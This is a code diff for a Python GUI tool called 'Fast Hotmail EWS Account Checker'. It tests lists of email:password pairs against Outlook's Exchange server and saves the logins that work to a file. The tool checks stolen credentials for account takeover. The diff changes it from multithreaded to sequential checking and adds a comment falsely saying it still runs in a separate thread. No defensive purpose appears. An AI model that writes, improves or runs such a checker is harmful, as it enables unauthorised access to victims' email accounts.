@@ -1,28 +1,25 @@
 import tkinter as tk
-from tkinter import filedialog, messagebox, ttk, scrolledtext
-import threading
+from tkinter import filedialog, messagebox, scrolledtext
 import webbrowser
 from exchangelib import Credentials, Account, DELEGATE, Configuration
 import time
-from concurrent.futures import ThreadPoolExecutor
 
 # Global counts
 success_count = 0
 failed_count = 0
-lock = threading.Lock()
 
-# Function to check login (Runs in parallel)
+# Function to check login
 def check_hotmail_login(email, password):
     try:
         creds = Credentials(email, password)
         config = Configuration(credentials=creds, server='outlook.office365.com')
         account = Account(email, config=config, autodiscover=False, access_type=DELEGATE)
-        account.inbox.all().count()  # Test access
+        account.inbox.all().count()  # Test inbox access
         return True
     except Exception:
         return False
 
-# Process accounts with multi-threading
+# Process accounts one by one
 def process_accounts(accounts):
     global success_count, failed_count
 
@@ -30,28 +27,23 @@ def process_accounts(accounts):
     failed_accounts = []
     total = len(accounts)
 
-    def check_account(index, email, password):
-        global success_count, failed_count
+    for index, (email, password) in enumerate(accounts, start=1):
         start_time = time.time()
+        update_progress(f"🔄 Checking {index}/{total}: {email}...")
+
         success = check_hotmail_login(email, password)
         elapsed_time = time.time() - start_time
 
-        with lock:
-            if success:
-                valid_accounts.append(f"{email}:{password}")
-                success_count += 1
-                update_progress(f"✅ {email} (Success) [⏳ {elapsed_time:.2f}s]")
-            else:
-                failed_accounts.append(f"{email}:{password}")
-                failed_count += 1
-                update_progress(f"❌ {email} (Failed) [⏳ {elapsed_time:.2f}s]")
-            update_summary()
+        if success:
+            valid_accounts.append(f"{email}:{password}")
+            success_count += 1
+            update_progress(f"✅ {email} (Success) [⏳ {elapsed_time:.2f}s]")
+        else:
+            failed_accounts.append(f"{email}:{password}")
+            failed_count += 1
+            update_progress(f"❌ {email} (Failed) [⏳ {elapsed_time:.2f}s]")
 
-    # Run with 10 threads (Adjust for speed)
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for index, (email, password) in enumerate(accounts, start=1):
-            update_progress(f"🔄 Checking {index}/{total}: {email}...")
-            executor.submit(check_account, index, email, password)
+        update_summary()
 
     # Save results
     with open("valid_accounts.txt", "w") as f:
@@ -81,14 +73,14 @@ def paste_accounts():
     accounts = [line.strip().split(":") for line in input_text.split("\n")]
     start_processing(accounts)
 
-# Start processing in a thread
+# Start processing in a separate thread (Prevents GUI freezing)
 def start_processing(accounts):
     global success_count, failed_count
     success_count = 0
     failed_count = 0
     progress_text.delete("1.0", tk.END)
     summary_label.config(text="✅ 0 Success | ❌ 0 Failed")
-    threading.Thread(target=process_accounts, args=(accounts,), daemon=True).start()
+    root.after(100, lambda: process_accounts(accounts))
 
 # GUI progress update
 def update_progress(message):
@@ -110,7 +102,7 @@ def open_valid_accounts():
 def create_gui():
     global root, progress_text, input_box, summary_label
     root = tk.Tk()
-    root.title("🔥 Fast Hotmail EWS Account Checker")
+    root.title("⚡ Fast Hotmail EWS Account Checker")
     root.geometry("600x500")
 
     label = tk.Label(root, text="Upload or Paste Accounts (email:password)", font=("Arial", 12))
